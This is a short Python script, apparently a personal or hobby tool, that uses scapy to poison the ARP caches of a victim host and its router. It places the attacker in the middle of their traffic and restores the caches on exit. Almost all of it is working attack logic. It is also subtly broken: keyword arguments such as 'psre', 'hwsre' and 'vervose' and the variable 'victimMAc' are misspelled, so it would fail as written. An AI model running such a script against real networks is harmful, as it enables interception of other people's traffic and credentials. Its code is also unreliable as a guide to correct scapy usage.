#!/usr/bin/python

from scapy.all import *
import sys
import os
import time

# three functions- 2 helper and 1 attack
#poison - send a ARP reply pretending to the other, forward info to me
def poison(gMAC, vMAC,gIP,vIP):
	send(ARP(op = 2, pdst = vIP, psrc = gIP, hwdst= vMAC),verbose=0)
	send(ARP(op = 2, pdst = gIP, psre = vIP, hwdst= gMAC),vervose=0)

# the cure the effect of the poison	
def cure(gMAC, vMAC,gIP,vIP):
	send(ARP(op = 2, pdst = gIP, psrc = vIP, hwdst= "ff:ff:ff:ff:ff:ff",hwsre = vMAC), count = 5)
	send(ARP(op = 2, pdst = vIP, psre = gIP, hwdst= "ff:ff:ff:ff:ff:ff",hwsre = gMAC), count = 5)

# starts the poison, sleeps for 5 seconds and goes on until KeygboardInterrupt	
def attack():
	try:
		print("poisoning....")
		while True:
			poison(gatewayMac,victimMac,gatewayIP,victimIP)
			time.sleep(5)
	except KeyboardInterrupt:
		print("Restoring ARP Cache...")
		cure(gatewayMac,victimMac,gatewayIP,victimIP)
		print("Exiting....")
		sys.exit(1)
		

# my interface is "eno1" 		
interface = raw_input("Enter Your Network Interface:  ")
victimIP = raw_input("Enter victim IP:  ")
gatewayIP = raw_input("Enter Router IP:  ")
print("\n Enabling IP Forwarding....\n")
os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

try:
	victimAns, victimUnans = srp(Ether(dst = "ff:ff:ff:ff:ff:ff")/ARP(pdst = victimIP), timeout = 2, iface = interface, inter = 0.1)
	victimMac = victimAns[0][1].hwsrc
	gatewayAns, gatewayUnans = srp(Ether(dst = "ff:ff:ff:ff:ff:ff")/ARP(pdst = gatewayIP), timeout = 2, iface = interface, inter = 0.1)
	gatewayMac = gatewayAns[0][1].hwsrc
	print("Gateway MAC address Resolved:  ", gatewayMac)
	print("Victim Mac Address REsolved:  ", victimMAc)
except Exception:
	print("was unable to locate MAC address for given victim/gateway")
	print("Exiting...")
	sys.exit(1)
	
attack()
